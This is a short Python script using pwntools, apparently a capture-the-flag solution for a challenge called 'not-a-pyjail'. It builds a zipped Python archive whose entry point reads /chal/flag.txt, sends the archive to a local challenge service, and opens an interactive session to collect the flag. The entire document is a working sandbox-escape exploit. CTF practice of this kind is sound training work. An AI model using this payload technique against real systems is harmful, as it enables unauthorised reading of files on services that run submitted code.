from pwn import *
import os
import tempfile

tmpdir = tempfile.mkdtemp()

os.system(f"""
cd {tmpdir}
echo 'import sys;sys.stderr.write(open("/chal/flag.txt").read());exit(1)' > __main__.py
zip -r exploit.pyz __main__.py
""")

code = open(tmpdir + '/exploit.pyz', 'rb').read()
print(code)

# context.log_level = 'debug'
# r = process('./not-a-pyjail.py')
r = remote('0.0.0.0', 1337)

print(r.recvuntil('Write __EOF__ to end.\n'))
r.sendline(code)
r.sendline('__EOF__')
r.interactive()
